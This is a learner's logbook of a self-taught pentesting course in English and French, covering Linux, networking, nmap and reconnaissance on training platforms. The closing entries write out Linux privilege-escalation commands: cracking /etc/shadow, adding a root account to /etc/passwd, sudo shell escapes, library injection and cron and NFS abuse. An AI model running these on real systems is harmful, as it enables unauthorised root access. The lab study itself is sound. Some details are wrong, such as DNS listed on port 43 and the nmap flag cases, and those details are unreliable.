# Progress Logbook – Pentest Journey

---

## 2026-02-03 — Day 1

**Duration:** 40 min
**Mood:** 5/5
**Focus:** Penetration Testing Fundamentals

### 🛠️ What I did
- Watched educational videos on penetration testing fundamentals

### 📚 What I learned
- Basic concepts of penetration testing
- Fundamental security principles

### 🚧 Blockers
- None

### ➡️ Tomorrow
- Set up the work environment

---

## 2026-02-04 — Day 2

**Duration:** 120 min
**Mood:** 4/5
**Focus:** Environment Setup

### 🛠️ What I did
- Installed a fresh Linux distribution
- Optimized the work environment

### 📚 What I learned
- How to set up a solid foundation for penetration testing exercises
- Linux system best practices

### 🚧 Blockers
- None

### ➡️ Tomorrow
- Move on to web security tutorials

---

## 2026-02-05 — Day 3

**Duration:** 60 min
**Mood:** 4/5
**Focus:** Web Application Security

### 🛠️ What I did
- Clean Ubuntu installation
- Tutorial on React exploitation techniques

### 📚 What I learned
- System configuration for penetration testing
- Basics of web application exploitation (React)

### 🚧 Blockers
- None

---

## 2026-02-18 — Day 1 (Restart)

**Duration:** 60 min
**Mood:** 5/5
**Focus:** Linux Fundamentals

### 🛠️ What I did
- Learned basic Linux commands
- Completed Linux Fundamentals 1 on TryHackMe

### 📚 What I learned
- Can navigate the filesystem, search files recursively, and use output redirection

### 🚧 Blockers
- None

### ➡️ Tomorrow
- Deepen web exploitation techniques

---

## 2026-02-19 — Day 2

**Duration:** 30 min
**Mood:** 5/5
**Focus:** Linux Fundamentals Part 2 (TryHackMe)

### 🛠️ What I did
- Completed Tasks 1 to 5 of Linux Fundamentals Part 2
- Practiced file management commands on the THM machine
- Learned about SSH, file operations, and Linux permissions basics

### 📚 What I learned
- How to connect to a remote machine using SSH (network-based remote access)
- File and directory management: `touch`, `mkdir`, `cp`, `mv`, `rm`
- Difference between normal files and directories in `ls -l`
- Hidden files listing with `ls -a`
- File type identification using `file`
- Terminal management using `clear`
- Understanding Linux permission structure (r, w, x)
- Permission logic on directories (read = list, execute = traverse)
- Numeric permissions system (e.g., 777, 750)
- Basic usage of `su` to switch users

### 🚧 Blockers
- Minor confusion about permission semantics on directories (r vs x)

---

## 2026-02-22/23 — Days 3 and 4

**Duration:** ~1h
**Mood:** 5/5
**Focus:** Linux Fundamentals Part 2 & Part 3 (completed)

### 🛠️ What I did
- Completed Linux Fundamentals Part 2 and Part 3 on TryHackMe
- Practiced file transfer, process management, services, and logging
- Reviewed Linux filesystem structure and system directories

### 📚 What I learned

#### Filesystem Structure
- `/etc` → system configuration files
- `/var` → variable data (logs, cache, spool)
- `/home` → user home directories
- `/root` → root user's home directory
- `/tmp` → temporary files storage

#### File Editing & Transfers
- Used `nano` to create and edit files
- Downloaded files using `wget`
- Transferred files between machines using `scp`

#### Process Management
- Viewed processes with `ps` and `ps aux`
- Monitored live processes using `top`
- Managed processes with `kill` (SIGTERM, SIGKILL, SIGSTOP)
- Suspended tasks with `CTRL+Z`, resumed with `fg` / `bg`

#### Services & System Control
- Managed services using `systemctl` (start, stop, enable, disable, status)

#### Task Automation
- Understood cron job structure and scheduling format (`* * * * *`)

#### Package Management
- Learned how `apt` installs and updates packages from repositories

#### Logging Basics
- Read Apache access logs in `/var/log/apache2/access.log`
- Identified:
  - Client IP
  - HTTP method (GET / POST)
  - Requested resource
  - HTTP status code

### 🚧 Blockers
- Need deeper understanding of log analysis
- Minor confusion around HTTP request semantics

---

## 2026-02-24 — Day 5 🏁

**Duration:** ~2–3h
**Mood:** 4/5
**Focus:** OverTheWire – Bandit (Level 0 → 15)

### 🛠️ What I did
- Completed Bandit levels 0 to 15
- Practiced SSH authentication and private key usage
- Applied Linux file manipulation, search and filtering techniques
- Used networking tools (`nc`)
- Worked with encodings and compression formats

### 💪 Key Skills Reinforced
- Handling tricky filenames (dashes, spaces, hidden files)
- Efficient file searching using `find`
- Filtering data with `grep`, `sort`, `uniq`
- Understanding stdout vs stderr (`2>/dev/null`)
- Base64 decoding
- ROT13 decoding using `tr`
- Working with hex dumps (`xxd -r`)
- Identifying file types with `file`
- Extracting compressed archives (`gzip`, `bzip2`, `tar`)
- Using SSH private keys (`chmod 400`, `ssh -i`)
- Basic TCP interaction using `nc`

### ⚠️ Weaknesses Identified
- Tendency to use Google too early
- Need stronger reflex with `man` pages
- Slight hesitation with text processing tools

### 🗺️ Action Plan
- Redo levels 5 → 12 without any external help
- Use `man` before Google
- Focus on mastering text-processing commands

---

## 2026-02-26 — Week 2 Day 1

**Duration:** ~1h
**Mood:** 4/5
**Focus:** Bash Scripting – Automated Backup Script

### 🛠️ What I did
- Built a complete Bash backup script from scratch
- Implemented variables for source and destination paths
- Used `date +"%Y-%m-%d"` for dynamic date formatting
- Used `basename` to extract directory names cleanly
- Added directory existence validation with `if [ ! -d ]`
- Added error handling with `exit 1`
- Used `mkdir -p` to safely create the destination directory
- Used `cp -r` to copy directory contents recursively

### 📚 What I learned
- Shebang portability: `#!/usr/bin/env bash` locates bash via `PATH` instead of a hardcoded path
- Variable declaration: `VAR=value`, referenced with `$VAR`
- Command substitution: `VAR=$(command)` stores a command's output in a variable
- Conditionals: `if [ condition ]; then ... fi`
- Directory existence check: `[ -d "$DIR" ]`
- Exit codes: `0` = success, non-zero = error
- Always quote variables (`"$VAR"`) to handle paths with spaces
- `cp -r "$SOURCE"` copies the directory itself; `cp -r "$SOURCE"/*` copies its contents
- `basename /path/to/dir` returns only the last component of a path

### ⚠️ Weaknesses Identified
- Initially confused `>` (redirect) with copy logic
- Attempted to use `|` between unrelated, independent commands
- Minor hesitation with `date` format specifiers

### ➡️ Next
- Make the script accept arguments instead of hardcoded paths
- Add logging capability

---

## 2026-02-27 — Week 2 Day 2

**Duration:** ~1h
**Mood:** 3/5
**Focus:** TryHackMe – Bash Scripting & Linux Shells

### 🛠️ What I did
- Completed TryHackMe – Bash Scripting module
- Completed TryHackMe – Linux Shells module

### 📚 What I learned

#### Bash Scripting THM
- Nothing new — concepts already covered when building the backup script the day before

#### Linux Shells THM
- Learned about different shell types and shell-specific features
- Covered environment variables, shell variables, and scripting basics
- *(Notes from this session were lost before saving)*

### 🚧 Blockers
- Frustrating to lose the Linux Shells notes — need to write them down immediately next time

### ➡️ Tomorrow
- Move on to OverTheWire Bandit — continue from level 15

---

## 2026-02-28 — Week 2 Day 3

**Duration:** ~2h30
**Mood:** 4/5
**Focus:** OverTheWire – Bandit (Level 15 → 25)

### 🛠️ What I did
- Completed Bandit levels 15 to 25
- Worked with SSL/TLS connections using `openssl s_client`
- Used `nmap` to scan port ranges and identify SSL-speaking services
- Retrieved and used an RSA private key
- Bypassed a hostile `.bashrc` by passing commands directly to SSH
- Exploited a SUID binary to read protected files
- Set up a `nc` listener in the background to interact with a TCP daemon
- Analyzed cron jobs to find auto-executed scripts
- Reverse-engineered a cron script generating MD5-based filenames
- Injected a custom script into a cron-monitored directory
- Brute-forced a 4-digit PIN by piping all combinations to a daemon via `nc`

### 📚 What I learned
- `openssl s_client` connects to SSL/TLS services — unlike `nc` which is plaintext
- `-ign_eof` keeps the connection alive until a response is received
- `nmap -p PORT_RANGE localhost` scans a range of ports for open services
- `diff` compares two files and shows differences (`<` = file1, `>` = file2)
- SSH can execute a single command without loading a shell: `ssh user@host command`
- SUID binaries run with the file owner's privileges — can be used to read protected files
- `nc -l -p PORT` creates a TCP listener — `&` runs it in the background
- `* * * * *` in cron = every minute; cron jobs can be found in `/etc/cron.d/`
- `md5sum` generates a hash; `cut -d ' ' -f 1` extracts the hash part
- `chmod 777` on a directory allows any user to write inside it
- `seq 0 9999` generates a numeric sequence; `printf '%04d'` formats with leading zeros
- Piping all PIN combinations in one `nc` session avoids 10,000 reconnections

### 🚧 Blockers
- Level 22 required understanding the exact string fed to `md5sum` — took time to reconstruct it

### ➡️ Tomorrow
- Root-Me App Script challenges
- Start Python scripting

---

## 2026-03-01 — Week 2 Day 4

**Duration:** ~2h
**Mood:** 4/5
**Focus:** Root-Me App Script + Python Scripting

### 🛠️ What I did
- Solved 4 Root-Me App Script challenges
- Built a Python script to check service status via `systemctl`
- Built a Python script to parse SSH auth logs and detect brute force attempts

### 📚 What I learned

#### Root-Me — App Script

**PATH Hijacking (System 1 & 2)**
- A SUID binary calling a command without an absolute path can be hijacked
- Create a fake binary with the same name, put its directory first in `$PATH`
- When the binary has arguments (`ls -lA`), `$1` can't be used — hardcode the path instead

**Sudo Path Traversal**
- A `*` wildcard in a sudo rule (`/bin/cat notes/*`) can be abused with `../` to escape the allowed directory
- `sudo -u user /bin/cat /allowed/path/../target/.passwd` reads outside the intended scope

**LaTeX Injection**
- A script compiling user-supplied `.tex` with elevated rights can be exploited
- `\openin` + `\read` + `\typeout` reads a file and prints its content to the compile log
- `%` is a LaTeX comment character — `\catcode\`\%=12` must disable it if the secret starts with `%`

**PowerShell Command Injection**
- Unsanitized input in a PowerShell script allows injecting commands via `;`
- `gc` is PowerShell's alias for `Get-Content` (equivalent of `cat`)

#### Python Scripting
- `sys.argv` — access command-line arguments
- `subprocess.run(["cmd", "arg"], capture_output=True, text=True)` — run a shell command from Python
- `result.stdout.strip()` — clean the command output
- `open(file, "r")` + `for line in f` — read a file line by line
- `line.split()` + `.index("word")` — parse structured log lines
- `dict.get(key, default)` — count occurrences safely with a default value

### 🚧 Blockers
- LaTeX Injection took multiple attempts due to the `%` character issue

### ➡️ Next
- Publish write-up for Bandit 15–25
- Continue Root-Me challenges

---

## 2026-03-02 — Week 3 Day 1

**Duration:** ~45min
**Mood:** 4/5
**Focus:** TryHackMe – What Is Networking

### 🛠️ What I did
- Completed TryHackMe – What Is Networking module

### 📚 What I learned
- Mostly consolidation — nothing fundamentally new, but good to have structured mémos for review
- A network = two or more devices connected to share resources
- Devices are identified by IP address and MAC address

### 🚧 Blockers
- None

### ➡️ Tomorrow
- OSI Model in depth

---

## 2026-03-03 — Week 3 Day 2

**Duration:** ~1h
**Mood:** 4/5
**Focus:** TryHackMe – Introductory Networking (OSI Model)

### 🛠️ What I did
- Studied the OSI model in full (7 layers)

### 📚 What I learned

#### OSI Model (7 layers — application to physical)
- Layer 7 Application — interface between apps and the network (browser, mail client, API)
- Layer 6 Presentation — data format translation, encryption/decryption, compression
- Layer 5 Session — session creation and management, allows multiple simultaneous connections
- Layer 4 Transport — transport protocol selection (TCP vs UDP), data segmentation
  - TCP: reliable, verifies packets, retransmits on loss — segments
  - UDP: fast, no verification, used for streaming/VoIP — datagrams
- Layer 3 Network — packet routing, IP addressing (logical addressing)
- Layer 2 Data Link — LAN communication, MAC addressing (physical addressing), NIC
- Layer 1 Physical — physical data transmission, converts bits to signals (electrical / optical / radio)

Mnemonic (FR): "Alain part servir trois nachos à des péruviens"

### 🚧 Blockers
- None

### ➡️ Tomorrow
- TCP/IP model

---

## 2026-03-04 — Week 3 Day 3

**Duration:** ~1h
**Mood:** 4/5
**Focus:** TryHackMe – Introductory Networking (TCP/IP model)

### 🛠️ What I did
- Studied the TCP/IP model and its historical context
- Compared TCP/IP layers to OSI layers

### 📚 What I learned

#### TCP/IP Model (4 layers)
- Application / Transport / Internet / Network Interface
- TCP/IP is the real standard used on the internet — OSI is a pedagogical model
- Standardized in 1982 by the US DoD to replace incompatible proprietary systems

#### TCP vs UDP
- TCP: reliable, verifies packets, retransmits on loss, slower
- UDP: fast, no verification, used for streaming and VoIP

### 🚧 Blockers
- None

### ➡️ Tomorrow
- Three-Way Handshake + common ports

---

## 2026-03-05 — Week 3 Day 4

**Duration:** ~45min
**Mood:** 4/5
**Focus:** TryHackMe – Introductory Networking (Three-Way Handshake + ports)

### 🛠️ What I did
- Analyzed the TCP Three-Way Handshake in detail
- Mapped common port numbers to their protocols

### 📚 What I learned

#### Three-Way Handshake (TCP connection setup)
1. SYN — client requests connection
2. SYN + ACK — server accepts
3. ACK — client confirms, connection established

#### Common ports
| Port | Protocol |
|------|----------|
| 21   | FTP      |
| 22   | SSH      |
| 43   | DNS      |
| 80   | HTTP     |
| 443  | HTTPS    |
| 3389 | RDP      |

### 🚧 Blockers
- None

### ➡️ Tomorrow
- DNS in depth

---

## 2026-03-06 — Week 3 Day 5

**Duration:** ~1h
**Mood:** 4/5
**Focus:** TryHackMe – Introductory Networking (DNS)

### 🛠️ What I did
- Studied DNS resolution process and hierarchy in depth
- Practiced with `dig` to query DNS manually

### 📚 What I learned

#### DNS (Domain Name System)
- Translates domain names to IP addresses (`www.google.com → 142.250.x.x`)
- Resolution order:
  1. Local hosts file (`/etc/hosts`)
  2. DNS cache
  3. Recursive DNS server (ISP or public like 8.8.8.8)
  4. Root Name Server → TLD Server (.com / .org) → Authoritative Name Server

#### TTL (Time To Live)
- Tells the computer how long to cache a DNS record before re-querying
- Example: TTL = 157 → after 157 seconds, a new DNS query is required

#### dig
- `dig domain` — standard DNS lookup
- `dig domain @8.8.8.8` — query a specific DNS server
- ANSWER section shows resolved IP; TTL shows cache duration

### 🚧 Blockers
- None

### ➡️ Tomorrow
- ping, traceroute, whois

---

## 2026-03-07 — Week 3 Day 6

**Duration:** ~1h
**Mood:** 4/5
**Focus:** TryHackMe – Introductory Networking (ping / traceroute / whois)

### 🛠️ What I did
- Studied `ping`, `traceroute`, and `whois` — flags and use cases

### 📚 What I learned

#### ping
- Sends ICMP echo requests to test host reachability
- `-4` forces IPv4, `-i` sets interval between packets, `-v` verbose output

#### traceroute
- Maps the path packets take to a destination, recording each hop
- Uses the Internet layer by default
- `-i` specifies the interface, `-t` uses TCP SYN instead of default UDP

#### whois
- Queries domain registration info and IP address ownership
- Predecessor to domain name resolution (pre-DNS era)

### 🚧 Blockers
- None

### ➡️ Tomorrow
- Wireshark practical

---

## 2026-03-08 — Week 3 Day 7

**Duration:** ~1h30
**Mood:** 4/5
**Focus:** Wireshark – Live traffic capture and analysis

### 🛠️ What I did
- Installed and configured Wireshark
- Captured a TCP Three-Way Handshake
- Captured DNS traffic using `dig`
- Captured HTTP traffic using `curl`

### 📚 What I learned

#### Wireshark
- Open source cross-platform packet analyzer
- Captures and inspects live network traffic in real time
- Allows filtering by protocol, IP, port, and other criteria

#### TCP Handshake capture
- Observed SYN → SYN+ACK → ACK sequence
- Confirms TCP connection establishment between client and server

#### DNS capture
- Generated with `dig example.com`
- Observed: standard query (client → DNS server) + standard query response

#### HTTP capture
- Generated with `curl http://example.com`
- Observed: `GET / HTTP/1.1` request → `200 OK` response

### 🚧 Blockers
- None

### ➡️ Next
- Continue Root-Me challenges
- Start PortSwigger Web Security Academy

---

## 2026-03-09 — Week 4 Day 1

**Duration:** ~1h30
**Mood:** 4/5
**Focus:** TryHackMe – NMAP (types de scans & bases)

### 🛠️ What I did
- Étudié les trois types de scans principaux (TCP Connect, SYN, UDP)
- Mémorisé la structure des 65535 ports et les ports courants
- Pratiqué les options nmap en ligne de commande

### 📚 What I learned

#### Structure des ports
- Chaque machine possède 65535 ports
- Ports 0–1023 = well-known (protocoles réservés)
- HTTP: 80 / HTTPS: 443 / NetBIOS: 139 / SMB: 445

#### TCP Connect Scan (-sT)
- Complète le Three-Way Handshake complet sur chaque port
- Plus bruyant — laisse des traces dans les logs de la cible
- Utilisé sans accès root (quand -sS n'est pas disponible)

#### SYN "Half-open" Scan (-sS)
- Scan le plus populaire — nécessite root/sudo
- Envoie SYN → reçoit SYN+ACK → envoie RST (handshake incomplet)
- Plus rapide et plus discret que -sT

#### UDP Scan (-sU)
- Plus lent — pas de handshake, repose sur ICMP "port unreachable" pour les ports fermés
- Aucune réponse → port marqué open|filtered
- RFC 9293 définit le comportement correct du protocole TCP

### 🚧 Blockers
- None

### ➡️ Tomorrow
- Types de scans avancés (NULL, FIN, Xmas) et NSE

---

## 2026-03-10 — Week 4 Day 2

**Duration:** ~1h30
**Mood:** 4/5
**Focus:** TryHackMe – NMAP (scans avancés & NSE)

### 🛠️ What I did
- Étudié les scans NULL, FIN et Xmas
- Exploré le Nmap Scripting Engine (NSE) et ses catégories de scripts
- Pratiqué les flags d'output et de timing

### 📚 What I learned

#### Types de scans avancés
- NULL (-sN) — paquet TCP sans aucun flag ; cible envoie RST si port fermé
- FIN (-sF) — flag FIN envoyé ; cible envoie RST si port fermé
- Xmas (-sX) — flags PSH, URG, FIN (ressemble à un sapin en Wireshark) ; RST si fermé
- Ces trois types sont utilisés pour l'**évasion de firewall**
- Windows peut répondre avec RST sur tous les ports — peu fiable sur Windows

#### Catégories NSE
- `safe` — aucun impact sur la cible
- `intrusive` — peut affecter la cible
- `vuln` — scan de vulnérabilités connues
- `exploit` — tentative d'exploitation
- `auth` — bypass d'authentification (ex: FTP anonyme)
- `brute` — brute-force de credentials
- `discovery` — interroge les services pour obtenir des infos réseau

#### Flags principaux
- `-o` — détection d'OS
- `-sV` — détection de version des services
- `-v` / `-vv` — verbosité (recommandé: `-vv`)
- `-oA` — output dans les 3 formats majeurs simultanément
- `-oN` — output normal vers fichier
- `-oG` — output au format grep
- `-a` — mode agressif
- `-T<0-5>` — timing template (plus élevé = plus rapide = plus bruyant)
- `-p <port>` / `-p-` — port spécifique ou tous les 65535
- `--script <nom>` — exécuter un script NSE spécifique
- `--script=vuln` — exécuter tous les scripts de la catégorie vuln
- `--top-ports <n>` — scanner les n ports les plus courants

### 🚧 Blockers
- None

### ➡️ Tomorrow
- Évasion de firewall avec NMAP + Passive Reconnaissance

---

## 2026-03-11 — Week 4 Day 3

**Duration:** ~1h
**Mood:** 4/5
**Focus:** TryHackMe – NMAP (évasion firewall) + Passive Reconnaissance

### 🛠️ What I did
- Complété la section évasion de firewall NMAP
- Complété le module THM Passive Reconnaissance

### 📚 What I learned

#### NMAP — Évasion de firewall
- `-Pn` — skip le ping de découverte (utile quand ICMP est bloqué)
- `-f` — fragmente les paquets en morceaux plus petits pour tromper l'IDS
- `--mtu <n>` — taille de transmission maximum personnalisée (multiple de 8)
- `--scan-delay <n>ms` — délai entre paquets (évasion de triggers temporels)
- `--badsum` — checksum invalide pour détecter la présence d'un firewall
- `--data-length <n>` — ajoute des données aléatoires aux paquets
- Protocole bloqué par `-Pn` : ICMP

#### Passive vs Active Reconnaissance
- Passive : aucun contact direct (DNS, offres d'emploi, articles de presse)
- Active : contact direct (connexion aux serveurs, social engineering, accès physique)

#### Types d'enregistrements DNS
| Type  | Résultat             |
|-------|----------------------|
| A     | Adresses IPv4        |
| AAAA  | Adresses IPv6        |
| CNAME | Canonical Name       |
| MX    | Serveurs de mail     |
| SOA   | Start of Authority   |
| TXT   | Enregistrements TXT  |

#### nslookup
- `nslookup -type=A domain` — lookup IPv4
- `nslookup -type=MX domain 1.1.1.1` — enregistrements MX via serveur spécifique
- `nslookup -type=TXT domain` — enregistrements TXT

### 🚧 Blockers
- None

### ➡️ Tomorrow
- Active Reconnaissance

---

## 2026-03-12 — Week 4 Day 4

**Duration:** ~1h
**Mood:** 4/5
**Focus:** TryHackMe – Active Reconnaissance

### 🛠️ What I did
- Complété le module THM Active Reconnaissance
- Pratiqué le banner grabbing avec telnet
- Revu les options netcat et leurs cas d'usage

### 📚 What I learned

#### ping — détails
- `-s` — définit la taille des données portées par la requête ICMP echo
- Taille de l'en-tête ICMP : 8 bytes
- Le Firewall Windows bloque ping par défaut

#### Telnet pour le banner grabbing
- Telnet ouvre une connexion TCP brute — il faut parler le protocole du service manuellement
- Port 80 → HTTP → `GET / HTTP/1.0` + deux Entrées
- Port 25 → SMTP → `EHLO`, `MAIL FROM:`, etc.
- Port 110 → POP3 → `USER`, `PASS`
- Les headers de réponse révèlent le nom et la version du service (`Server: nginx/1.6.2`)

#### Netcat — options
- `-l` — mode écoute
- `-p` — spécifier le port
- `-n` — numérique uniquement, pas de résolution DNS
- `-v` — output verbeux
- `-vv` — très verbeux
- `-k` — continuer à écouter après déconnexion du client
- Port < 1024 nécessite root pour écouter

### 🚧 Blockers
- None

### ➡️ Tomorrow
- Module Linux PrivEsc

---

## 2026-03-13 — Week 4 Day 5

**Duration:** ~2h
**Mood:** 4/5
**Focus:** TryHackMe – Linux PrivEsc (énumération + exploitation shadow/passwd)

### 🛠️ What I did
- Démarré le module Linux Privilege Escalation
- Pratiqué les techniques d'énumération système
- Exploité /etc/shadow et /etc/passwd en world-writable

### 📚 What I learned

#### Énumération
- `uname -a` — infos système (kernel, architecture)
- `id && whoami` — utilisateur courant
- `cat /etc/passwd` — liste des utilisateurs
- `sudo -l` — droits sudo de l'utilisateur courant
- `ps aux` — processus en cours
- `find / -perm -u=s -type f 2>/dev/null` — fichiers SUID
- `cat /etc/crontab` — tâches cron planifiées
- `cat ~/.*history | less` — historique des commandes
- `cat /etc/exports` — configuration NFS

#### Cracker /etc/shadow
- Extraire le hash: `grep "root" /etc/shadow > hash.txt`
- Craquer: `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
- Afficher: `john --show hash.txt`
- John doit tourner sur **Kali**, pas sur la cible

#### /etc/shadow world-writable
- Générer un hash: `mkpasswd -m sha-512 monmotdepasse`
- Remplacer le hash root directement dans `/etc/shadow`
- `su root`

#### /etc/passwd world-writable
- Générer un hash: `openssl passwd monmotdepasse`
- Ajouter: `echo 'newroot:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd`
- `su newroot`

### 🚧 Blockers
- None

---

## 2026-03-14 — Week 4 Day 6

**Duration:** ~1h30
**Mood:** 4/5
**Focus:** TryHackMe – Linux PrivEsc (GTFOBins sudo + LD_PRELOAD)

### 🛠️ What I did
- Exploité des permissions sudo mal configurées via GTFOBins
- Exploité LD_PRELOAD et LD_LIBRARY_PATH pour escalader les privilèges

### 📚 What I learned

#### Sudo — GTFOBins
- `sudo find . -exec /bin/sh \; -quit`
- `sudo vim -c ':!/bin/sh'`
- `sudo awk 'BEGIN {system("/bin/sh")}'`
- `sudo nmap --interactive` puis `!sh`
- `sudo less /etc/passwd` puis `!/bin/sh`
- Référence : https://gtfobins.github.io

#### LD_PRELOAD
- Si `env_keep+=LD_PRELOAD` dans sudoers → injecter une shared library avant tout `sudo`
- `gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c`
- `sudo LD_PRELOAD=/tmp/preload.so find`

#### LD_LIBRARY_PATH
- `ldd /usr/sbin/apache2` — lister les bibliothèques utilisées par un binaire
- Remplacer l'une d'elles par une version malveillante compilée dans /tmp
- `sudo LD_LIBRARY_PATH=/tmp apache2`

### 🚧 Blockers
- None

---

## 2026-03-15 — Week 4 Day 7

**Duration:** ~1h30
**Mood:** 4/5
**Focus:** TryHackMe – Linux PrivEsc (cron hijacking + NFS)

### 🛠️ What I did
- Exploité le PATH hijacking sur des cron jobs
- Exploité la misconfiguration NFS no_root_squash

### 📚 What I learned

#### Cron Jobs — PATH Hijacking
- `cat /etc/crontab` — vérifier si le PATH commence par un répertoire inscriptible
- Créer un faux script avec le même nom que le binaire cron dans ce répertoire
- Le script copie /bin/bash vers /tmp/rootbash avec le bit SUID
- Attendre 1 minute, puis exécuter `/tmp/rootbash -p`
- Toujours nettoyer : `rm /tmp/rootbash && exit`

#### NFS — no_root_squash
- `cat /etc/exports` — chercher les partages avec `no_root_squash`
- Avec cette option, root sur la machine attaquante est traité comme root sur le partage NFS
- Sur Kali (en root) : monter le partage, créer un binaire SUID avec msfvenom, `chmod +xs`
- Sur la cible : exécuter le binaire → shell root

#### Recall d'énumération
- `cat ~/.*history | grep -i 'mysql\|pass\|ssh'` — chercher des credentials dans l'historique
- Toujours `exit` proprement après un shell root
- Nettoyer les fichiers temporaires après chaque exploit

### 🚧 Blockers
- None